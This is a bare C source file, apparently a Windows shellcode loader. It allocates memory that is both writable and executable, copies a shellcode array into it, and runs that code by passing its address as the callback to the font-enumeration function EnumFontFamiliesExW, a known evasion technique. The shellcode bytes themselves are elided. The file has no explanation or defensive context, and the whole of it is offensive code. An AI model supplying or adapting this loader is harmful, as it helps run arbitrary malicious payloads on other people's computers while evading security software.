#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = ...

int main() {
    LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(address, &shellcode[0], sizeof(shellcode));
    LOGFONTW lf = { 0 };
    lf.lfCharSet = DEFAULT_CHARSET;
    HDC dc = GetDC(NULL);
    EnumFontFamiliesExW(dc, &lf, (FONTENUMPROCW)address, 0, 0);
    return 0;
}